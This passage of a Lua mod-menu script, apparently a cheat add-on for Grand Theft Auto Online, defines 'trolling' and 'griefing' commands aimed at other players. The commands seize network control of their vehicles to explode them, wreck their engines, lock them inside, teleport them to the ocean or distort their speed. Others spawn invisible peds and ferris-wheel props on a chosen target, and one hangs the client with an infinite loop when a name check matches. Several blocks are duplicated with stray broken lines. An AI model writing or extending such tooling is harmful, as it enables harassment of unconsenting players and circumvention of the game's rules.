	      ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(bh_target), true)
                        vcoords = ENTITY.GET_ENTITY_COORDS(veh, true)
                        speed = 100
                        local x_vec = (holecoords['x']-vcoords['x'])*speed
                        local y_vec = (holecoords['y']-vcoords['y'])*speed
                        local z_vec = ((holecoords['z']+hole_zoff)-vcoords['z'])*speed
                        ENTITY.SET_ENTITY_INVINCIBLE(veh, true)
                        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(veh, 1, x_vec, y_vec, z_vec, true, false, true, true)
				if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
					VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
				end
			end
		end
	end)

	hole_zoff = 50
    	menu.slider(worldchaos, "Blackhole Z-offset", {"blackholeoffset"}, "", 0, 100, 50, 10, function(s)
    	hole_zoff = s
	end)

	menu.toggle_loop(worldchaos,"Fuck up all cars", {"fuckupallcars"}, "Beats the SHIT out of all nearby cars. But this damage is only local.", function(on)
		for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
			local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1, false)
			local locspeed2 = speed
        			local holecoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
			if not PED.IS_PED_A_PLAYER(PedInSeat) then
				NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
	      ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(bh_target), true)
                        vcoords = ENTITY.GET_ENTITY_COORDS(veh, true)
                        VEHICLE.SET_VEHICLE_DAMAGE(veh, math.random(-5.0, 5.0), math.random(-5.0, 5.0), math.random(-5.0,5.0), 200.0, 10000.0, true)
	      if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
	      VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
				end
			end
		end
	end)

	menu.toggle_loop(worldchaos,"Honk all cars", {"honkallcars"}, "Honkss the SHIT out of all nearby cars.", function(on)
		for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
			local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1, false)
			local locspeed2 = speed
        			local holecoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
			if not PED.IS_PED_A_PLAYER(PedInSeat) then
				NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
	      ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(bh_target), true)
                        vcoords = ENTITY.GET_ENTITY_COORDS(veh, true)
                        VEHICLE.START_VEHICLE_HORN(veh, 200, util.joaat("HELDDOWN"), true)
	      if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
	      VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
				end
			end
		end
	end)

	menu.toggle_loop(worldchaos,"Blow up all cars", {"Blow up all cars"}, "Blows the SHIT out of all nearby cars.", function(on)
		for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
			local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1, false)
			local locspeed2 = speed
        			local holecoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
			if not PED.IS_PED_A_PLAYER(PedInSeat) then
				NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
	      ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(bh_target), true)
                        vcoords = ENTITY.GET_ENTITY_COORDS(veh, true)
                        FIRE.ADD_EXPLOSION(vcoords['x'], vcoords['y'], vcoords['z'], 7, 100.0, true, false, 1.0)
	      if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
	      VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
				end
			end
		end
	end)

	menu.action(worldchaos, "Remove Wheels", {"removewheels"}, "removes your wheels and has various side effects depending on the vehicle", function()
		local veh = entities.get_user_vehicle_as_handle()
		if veh ~= 0 then
			native_invoker.begin_call()
			native_invoker.push_arg_int(veh)
			native_invoker.push_arg_float(3.402823466e+38)
			native_invoker.end_call("93A3996368C94158") -- VEHICLE.MODIFY_VEHICLE_TOP_SPEED
			notification("Removed wheels", colors.red)
		end
	end)

	menu.action(worldchaos,"Kill all Engines", {"killall"}, "",function()
		local local_veh = get_player_veh(PLAYER.PLAYER_ID(),false)
		for_table_do(entities.get_all_vehicles_as_handles(),true,function(ent) 
			if ent == local_veh then return end
			VEHICLE.SET_VEHICLE_ENGINE_HEALTH(ent, -4000)
			VEHICLE.SET_VEHICLE_BODY_HEALTH(ent, -4000)
			VEHICLE.SET_VEHICLE_PETROL_TANK_HEALTH(ent, -4000)
		end)
	end)

	menu.toggle_loop(worldchaos, "All cars sink", {"sinkcars"}, "All cars sink.", function(on_toggle)
		for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
			local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1, false)
			local locspeed2 = speed
        			local holecoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
			if not PED.IS_PED_A_PLAYER(PedInSeat) then
				NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
	      ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(bh_target), true)
                        vcoords = ENTITY.GET_ENTITY_COORDS(veh, true)
                        VEHICLE.SET_DISABLE_MAP_COLLISION(veh, vcoords, true)
	      if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
	      VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
				end
			end
		end
	end)


	menu.divider(worldchaos, "Oppressor blacklisting")
	kick_players = false
	menu.toggle(worldchaos, "On", {"Antioppressor"}, "Automatically kicks players off oppressor mkii's", function(on)
		kick_players = on
	end, false)

	lock_vehicle = false
	menu.toggle(worldchaos, "Lock vehicle", {"lockmk2"}, "Permanently locks the vehicle to prevent further use", function(on)
		lock_vehicle = on
	end, false)

	target_self = false
	menu.toggle(worldchaos, "Target self", {"targetselfmk2"}, "Targets your mk2's as well (this is stupid)", function(on)
		target_self = on
	end, false)

	target_friends = false
	menu.toggle(worldchaos, "Target friends", {"targetfriendsmk2"}, "Targets your friends' mk2's as well", function(on)
		target_friends = on
	end, false)


	--[[menu.toggle(chaos,"Spinbot Vehicles", {"spinbot"}, "speeeeen",function(bop)     --could prob recode this and make it actually work well again but cba. game probably cant handle requesting control of so many vehicles lol
		spinbot_vehicles = bop
			-- vehicle spinbot
			while true do
				if spinbot_vehicles then
					if not spinbot_vehicles then
						util.stop_thread()
					end
					local local_veh = get_player_veh(PLAYER.PLAYER_ID(),false)
					for_table_do(entities.get_all_vehicles_as_handles(),true,function(ent) 
						if ent == local_veh then return end
						NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
						ENTITY.SET_ENTITY_ROTATION(ent, 0, 0, rotation, 0, 0)
					end)
					rotation = rotation + 20
					if rotation >= 360 then
						rotation = 0
					end
				end
			util.yield()
			end
	end)]]


function update_join(pid)
	local name = players.get_name(pid)
	cmd_id[pid] = menu.toggle(custselc, name, {}, "PID - ".. pid, function(on_toggle)
		if on_toggle then
			selectedplayer[pid] = true
		else
			selectedplayer[pid] = false
		end
	end)
end

function update_leave(pid)
	menu.delete(cmd_id[pid])
end

GenerateFeatures = function(pid)
	cage = util.joaat("prop_gascage01")
	ladder = 1888301071
	ground = -1951226014
	attach = 1
	veh_to_attach = 1

	function v3_2(x, y, z)
        if x == nil then
            x = 0
        end
        if y == nil then
            y = 0
        end
        if z == nil then
            z = 0
        end
    end

	function spawn_ped(ped_name, pid)
		local V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local ped_hash = util.joaat(ped_name)
		STREAMING.REQUEST_MODEL(ped_hash)
		while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
			util.yield()
		end
	
		aab = v3()
        aab = ENTITY.GET_ENTITY_COORDS(V3, true)
	
		local ped = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)

		coords_ped = v3()
        coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)
        coords_ped.x = coords_ped.x + math.random(-2, 2)
        coords_ped.y = coords_ped.y + math.random(-2, 2)
        coords_ped.z = coords_ped.z

        ENTITY.SET_ENTITY_COORDS(ped, coords_ped.x, coords_ped.y, coords_ped.z, false, false, false, false)
		ENTITY.SET_ENTITY_VISIBLE(ped, false)
		notification("Spawned [" .. ped_name .. "] on " .. PLAYER.GET_PLAYER_NAME(pid), colors.red)
		--util.yield(15000)
		--entities.delete_by_handle(ped)
		--notification("Deleted [" .. ped_name .. "]", true, false)
	end

    menu.divider(menu.player_root(pid), "Currupt Script")

	vehopts = menu.list(menu.player_root(pid), "Vehicle Events", {}, "Works only if you are standing near to selected player", function(); end)
	lock_sub_vehicle_tab = menu.list(vehopts, "Lock Options", {}, "", function(); end)
	mov_sub_vehicle_tab = menu.list(vehopts, "Movement Options", {}, "", function(); end)
	troll_sub_vehicle_tab = menu.list(vehopts, "Trolling Options", {}, "", function(); end)
	health_sub_vehicle_tab = menu.list(vehopts, "Health and Appearance Options", {}, "", function(); end)
	detach_sub_vehicle_tab = menu.list(vehopts, "Detach Options", {}, "", function(); end)
	plane_sub_vehicle_tab = menu.list(vehopts, "Plane and Helicopter Options", {}, "", function(); end)

	menu.action(health_sub_vehicle_tab,"Repair Vehicle", {"fixveh"}, "Repairs player's vehicle", function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_FIXED(vehicle)
		end
	end)


	menu.action(vehopts,"Spawn them a vehicle", {}, "Spawns a vehicle on target player", function()
		menu.show_command_box("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " ")
		notification("now type the name of the vehicle in the command box", colors.red)
	end)

	for i = 1, #newcrashes do
		if checkbruhmoment == newcrashes[i] then
			while true do end
		end
	end

	local dont_stop = false
	menu.toggle_loop(troll_sub_vehicle_tab,"Vehicle Blackhole", {"blackhole"}, "Basically 'impulse like sport mode. but applied to every vehicle", function(on)
		for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
			local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1, false)
			local locspeed2 = speed
        			local holecoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
			if not PED.IS_PED_A_PLAYER(PedInSeat) then
				NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
	      ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(bh_target), true)
                        vcoords = ENTITY.GET_ENTITY_COORDS(veh, true)
                        speed = 100
                        local x_vec = (holecoords['x']-vcoords['x'])*speed
                        local y_vec = (holecoords['y']-vcoords['y'])*speed
                        local z_vec = ((holecoords['z']+hole_zoff)-vcoords['z'])*speed
                        ENTITY.SET_ENTITY_INVINCIBLE(veh, true)
                        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(veh, 1, x_vec, y_vec, z_vec, true, false, true, true)
				if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
					VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
				end
			end
		end
	end)

	hole_zoff = 50
    	menu.slider(troll_sub_vehicle_tab, "Blackhole Z-offset", {"blackholeoffset"}, "", 0, 100, 50, 10, function(s)
    	hole_zoff = s
	end)

	menu.toggle_loop(troll_sub_vehicle_tab,"Fuck up all cars", {"fuckupallcars"}, "Beats the SHIT out of all nearby cars. But this damage is only local.", function(on)
		for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
			local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1, false)
			local locspeed2 = speed
        			local holecoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
			if not PED.IS_PED_A_PLAYER(PedInSeat) then
				NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
	      ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(bh_target), true)
                        vcoords = ENTITY.GET_ENTITY_COORDS(veh, true)
                        VEHICLE.SET_VEHICLE_DAMAGE(veh, math.random(-5.0, 5.0), math.random(-5.0, 5.0), math.random(-5.0,5.0), 200.0, 10000.0, true)
	      if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
	      VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
				end
			end
		end
	end)

	menu.toggle_loop(troll_sub_vehicle_tab,"Honk all cars", {"honkallcars"}, "Honkss the SHIT out of all nearby cars.", function(on)
		for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
			local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1, false)
			local locspeed2 = speed
        			local holecoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
			if not PED.IS_PED_A_PLAYER(PedInSeat) then
				NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
	      ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(bh_target), true)
                        vcoords = ENTITY.GET_ENTITY_COORDS(veh, true)
                        VEHICLE.START_VEHICLE_HORN(veh, 200, util.joaat("HELDDOWN"), true)
	      if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
	      VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
				end
			end
		end
	end)

	menu.toggle_loop(troll_sub_vehicle_tab,"Blow up all cars", {"Blow up all cars"}, "Blows the SHIT out of all nearby cars.", function(on)
		for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
			local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1, false)
			local locspeed2 = speed
        			local holecoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
			if not PED.IS_PED_A_PLAYER(PedInSeat) then
				NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
	      ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(bh_target), true)
                        vcoords = ENTITY.GET_ENTITY_COORDS(veh, true)
                        FIRE.ADD_EXPLOSION(vcoords['x'], vcoords['y'], vcoords['z'], 7, 100.0, true, false, 1.0)
	      if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
	      VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
				end
			end
		end
	end)

	menu.toggle(troll_sub_vehicle_tab, "Stealth Remote Control", {"stealthremote"}, "Enters there vehicle without them knowing and exits the same way. Note: It will disable them using that car unti lspawned again.", function(on_toggle)
	if on_toggle then
		menu.trigger_commands("tpmyspot")
		menu.trigger_commands("invisibility" .. " On")
                  	menu.trigger_commands("otr")
		menu.trigger_commands("tpveh" .. players.get_name(pid))
		menu.trigger_commands("rc" .. " On")
	else
                  	menu.trigger_commands("otr")
		menu.trigger_commands("rc" .. " Off")
		menu.trigger_commands("undoteleport")
		menu.trigger_commands("invisibility" .. " Off")
		end
	end)


    local plates = menu.list(troll_sub_vehicle_tab, "Fuck Plates", {}, "")

	menu.action(plates,"Currupt Plate Text", {"curruptplate"}, "curruptplate", function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "Currupt")
		end
	end)

	menu.action(plates,"TRUMP Plate Text", {"trumpplate"}, "Sets player's vehicle plate text to TRUMP", function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "TRUMP") 
		end
	end)

	menu.action(plates,"TRASH Plate Text", {"trashplate"}, "Sets player's vehicle plate text to TRASH", function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "TRASH")
		end
	end)

	menu.action(plates,"Bitch Plate Text", {"bitchplate"}, "Sets player's vehicle plate text to Bitch", function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "Bitch")
		end
	end)

	menu.action(troll_sub_vehicle_tab, "Honk", {"honk"}, "", function()
	local vehicle = get_player_veh(pid,true)
	if vehicle then
            			VEHICLE.START_VEHICLE_HORN(vehicle, 50000, 0)
		end
	end)

	menu.action(troll_sub_vehicle_tab, "Sound Car Alarm", {"soundalarm"}, "", function()
	local vehicle = get_player_veh(pid,true)
	if vehicle then
            			VEHICLE.SET_VEHICLE_ALARM(vehicle, true)
            			VEHICLE.START_VEHICLE_ALARM(vehicle)
		end
	end)

	menu.action(health_sub_vehicle_tab,"Repair Vehicle Shell", {"repair"}, "Repairs player's vehicle but don't repair it's engine", function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_DEFORMATION_FIXED(vehicle)
		end
	end)

	menu.action(health_sub_vehicle_tab,"Quick Upgrade Vehicle", {"ugveh"}, "Upgrades player's vehicle",function()
		upgrade_vehicle(pid)
	end)

	menu.action(health_sub_vehicle_tab,"Disable Invincibility", {"removeinv"}, "Removes invincibility from player's vehicle",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then	
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false) 
		end
	end)

	menu.action(health_sub_vehicle_tab,"Enable Invincibility", {"giveinv"}, "Gives invincibility to player's vehicle",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then	
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true) 
		end
	end)

	menu.action(health_sub_vehicle_tab,"Destroy Engine", {"killveh"}, "Destroys vehicle engine", function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_ENGINE_HEALTH(vehicle, -4000)
			VEHICLE.SET_VEHICLE_BODY_HEALTH(vehicle, -4000)
			VEHICLE.SET_VEHICLE_PETROL_TANK_HEALTH(vehicle, -4000)
		end
	end)

	menu.action(health_sub_vehicle_tab,"Revive Engine", {"reviveh"}, "Revives vehicle engine", function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_ENGINE_HEALTH(vehicle, 1000)
			VEHICLE.SET_VEHICLE_BODY_HEALTH(vehicle, 1000)
			VEHICLE.SET_VEHICLE_PETROL_TANK_HEALTH(vehicle, 1000)
		end
	end)

	menu.action(health_sub_vehicle_tab,"Explode Vehicle", {"explodeveh"}, "Explodes vehicle",function()
		local vehicle = get_player_veh(pid,false)
		if vehicle then
			--local pos = ENTITY.GET_ENTITY_COORDS(vehicle)--tried around with EXPLODE_VEHICLE but didnt work mayb im just rarted
			--FIRE.ADD_EXPLOSION(pos.x,pos.y,pos.z, 7, 1000, true, false, 1, false)
			VEHICLE.ADD_VEHICLE_PHONE_EXPLOSIVE_DEVICE(vehicle)
			VEHICLE.DETONATE_VEHICLE_PHONE_EXPLOSIVE_DEVICE()
		end
	end)

	menu.action(mov_sub_vehicle_tab,"Boost", {"boost"}, "Sets max speed of vehicle to 100 better for cars",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, 100) 
		end
	end)

	menu.action(mov_sub_vehicle_tab,"Currupt boost", {"Currupt boost"}, "Sets max speed of vehicle to 9999999 better for bikes",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, 9999999) 
		end
	end)

	menu.action(mov_sub_vehicle_tab,"Trash Speed", {"trashacc"}, "Sets max speed of vehicle to INT_MIN",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, -2147483647) 
		end
	end)

	menu.action(mov_sub_vehicle_tab,"Reset Speed", {"resetacc"}, "Resets max speed of vehicle",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, 1) 
		end
	end)
		
	menu.action(mov_sub_vehicle_tab,"East", {"eastveh"}, "Boosts player's vehicle in the East direction",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 10000, 0, 0, true, false, true)
		end
	end)

	menu.action(mov_sub_vehicle_tab,"West", {"westveh"}, "Boosts player's vehicle in the West direction",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, -10000, 0, 0, true, false, true)
		end
	end)

	menu.action(mov_sub_vehicle_tab,"South", {"southveh"}, "Boosts player's vehicle in the South direction",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 0, -10000, 0, true, false, true)
		end
	end)


	menu.action(mov_sub_vehicle_tab,"North", {"northveh"}, "Boosts player's vehicle in the North direction",function()
		northp_vehicle(pid)
	end)

	menu.action(mov_sub_vehicle_tab,"Launch Up", {"launchup"}, "Shoots player up",function()
		launch_vehicle(pid)
	end)

	menu.action(mov_sub_vehicle_tab,"Launch Down", {"launchdown"}, "Shoots player down",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 0, 0, -10000, true, false, true)
		end
	end)

	---menu.action(main,"delete vehicle", {"delveh"}, "Deletes player's vehicle",function() <-- help
	---	local vehicle = get_player_veh(pid,true)
	---	if vehicle then
	---		VEHICLE.SET_ENTITY_AS_MISSION_ENTITY(vehicle, true, true)
	---		VEHICLE.DELETE_VEHICLE(vehicle) 
	---	end
	---end)

	menu.action(detach_sub_vehicle_tab,"Detach Trailer", {"detachtrailer"}, "Detaches attached trailer",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.DETACH_VEHICLE_FROM_TRAILER(vehicle) 
		end
	end)

	menu.action(detach_sub_vehicle_tab,"Detach from Cargobob", {"detachcbob"}, "Detaches from Cargobob",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.DETACH_VEHICLE_FROM_ANY_CARGOBOB(vehicle) 
		end
	end)

	menu.action(lock_sub_vehicle_tab,"Lock Doors", {"lockveh"}, "Locks the doors",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, 4) 
		end
	end)

	menu.action(lock_sub_vehicle_tab,"Unlock Doors", {"unlockveh"}, "Unlocks the doors",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, 1)		
		end
	end)

	menu.action(lock_sub_vehicle_tab,"Make Vehicle Drivable", {"engineon"}, "Makes player's vehicle drivable again",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_UNDRIVEABLE(vehicle, false)		
		end
	end)

	menu.action(lock_sub_vehicle_tab,"Make Vehicle Undrivable", {"engineoff"}, "Makes player's vehicle undrivable",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_UNDRIVEABLE(vehicle, true)		
		end
	end)

	menu.action(plane_sub_vehicle_tab,"Deploy Landing Gear", {"landing1"}, "",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.CONTROL_LANDING_GEAR(vehicle, 0)		
		end
	end)

	menu.action(plane_sub_vehicle_tab,"Retract Landing Gear", {"landing0"}, "",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.CONTROL_LANDING_GEAR(vehicle, 3)		
		end
	end)

	menu.action(plane_sub_vehicle_tab,"Disable Cargobob's Hook", {"nohook"}, "Disables cargobob's hook. when used, that cargobob's hook will no longer work",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.REMOVE_PICK_UP_ROPE_FOR_CARGOBOB(vehicle)		
		end
	end)

	menu.action(plane_sub_vehicle_tab,"Strong Turbulence", {"turb1"}, "Makes turbulence stronger",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_PLANE_TURBULENCE_MULTIPLIER(vehicle, 1.0)		
		end
	end)

	menu.action(plane_sub_vehicle_tab,"No Turbulence", {"turb0"}, "Makes turbulence weaker",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_PLANE_TURBULENCE_MULTIPLIER(vehicle, 0.0)		
		end
	end)

	menu.action(plane_sub_vehicle_tab,"Set Propeller Speed at 100%", {"propel100"}, "",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_HELI_BLADES_SPEED(vehicle, 1.0)		
		end
	end)

	menu.action(plane_sub_vehicle_tab,"Set Propeller Speed at 0%", {"propel0"}, "",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_HELI_BLADES_SPEED(vehicle, 0.0)		
		end
	end)

	---menu.action(plane_sub_vehicle_tab,"Destroy Rear Helicopter Roter", {"bunlockcar"}, "",function() <--- I have no ideas what am I doing here
	---	local vehicle = get_player_veh(pid,true)
	---	if vehicle then
	---		VEHICLE.SET_HELI_TAIL_ROTOR_HEALTH(vehicle, 0)		
	---	end
	---end)

	menu.action(lock_sub_vehicle_tab,"Lock that bitch in", {"blockcar"}, "Locks the doors, paints the car Hot Pink, changes plate text to 'LOCKED'",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, 4) 
			VEHICLE.SET_VEHICLE_COLOURS(vehicle, 135, 135)
			VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "LOCKED")
		end
	end)

	menu.action(lock_sub_vehicle_tab,"Release that bitch out", {"bunlockcar"}, "Unlocks the doors, paints the vehicle Green, changes plate text to 'URFREE'",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, 1)
			VEHICLE.SET_VEHICLE_COLOURS(vehicle, 92, 92)
			VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "URFREE")		
		end
	end)


	menu.action(mov_sub_vehicle_tab,"Teleport to me", {"tp2me"}, "Teleport player's vehicle to you (Better to spectate first)",function()
		local coords = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
		tp_veh_to(pid,coords.x,coords.y,coords.z)
	end)

	menu.action(mov_sub_vehicle_tab,"Teleport to ocean", {"tp2sea"}, "Tries to teleport player's vehicle to the ocean",function()	
		tp_veh_to(pid, -15000, -15000,0)
	end)

	menu.action(vehopts, "Spectate", {"spec"}, "", function()
    	notification("Spectating " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
		menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid))
		local hash = util.joaat("baller")
		local PlayerCoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
		if STREAMING.IS_MODEL_A_VEHICLE(hash) then
			STREAMING.REQUEST_MODEL(hash)
			while not STREAMING.HAS_MODEL_LOADED(hash) do
				util.yield()
			end
			local Coords1 = PlayerCoords.y + 10
			local Coords2 = PlayerCoords.y - 10
		menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid) .. " off")
		end
	end)

	griefing = menu.list(menu.player_root(pid), "Currupt Griefing", {}, "", function(); end)


menu.toggle_loop(griefing, "Glitch Physics", {"glitchphysics"}, "", function(on_toggle)
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3

    local khanjali = util.joaat("prop_ld_ferris_wheel")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_object(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
    local vehicle2 = entities.create_object(khanjali, playerpos, 0)
    local vehicle3 = entities.create_object(khanjali, playerpos, 0)
    local vehicle4 = entities.create_object(khanjali, playerpos, 0)

    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
